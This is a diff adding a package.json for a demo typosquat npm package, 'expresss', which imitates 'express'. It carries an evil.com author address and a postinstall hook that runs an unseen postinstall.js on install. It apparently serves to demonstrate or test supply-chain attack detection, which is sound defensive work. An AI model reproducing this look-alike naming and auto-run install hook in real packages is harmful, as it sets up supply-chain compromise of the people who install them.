@@ -1,0 +1,15 @@
+{
+  "name": "expresss",
+  "version": "1.0.1",
+  "description": "DEMO ONLY: typosquat-style package with suspicious postinstall",
+  "main": "index.js",
+  "author": "typo-team@evil.com",
+  "license": "UNLICENSED",
+  "scripts": {
+    "postinstall": "node postinstall.js",
+    "start": "node index.js"
+  },
+  "dependencies": {
+    "left-pad": "1.3.0"
+  }
+}
